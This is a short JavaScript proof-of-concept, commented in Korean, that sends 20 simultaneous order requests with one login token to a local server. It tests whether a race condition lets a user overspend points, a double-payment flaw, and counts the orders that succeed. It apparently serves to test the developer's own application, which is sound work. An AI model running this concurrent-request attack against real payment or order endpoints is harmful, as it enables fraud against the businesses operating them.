// 이중결제 PoC — 동시 주문 20개로 포인트 초과 사용 시도
// 사용법: TOKEN에 로그인 토큰 넣고 node poc/double_payment_attack.js
// ⚠️ 실제 토큰 커밋 X
const TOKEN = '로그인_토큰';

const requests = [];
for (let i = 0; i < 20; i++) {
  requests.push(
    fetch('http://localhost:3000/orders', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${TOKEN}`,
      },
      body: JSON.stringify({ productId: 2, quantity: 1 }),
    }).then((res) => res.json()),
  );
}

Promise.all(requests).then((results) => {
  const success = results.filter((r) => r.order_id !== undefined).length;
  const failed = results.filter((r) => r.error).length;
  console.log(`주문 성공: ${success}건, 실패(부족): ${failed}건`);
});
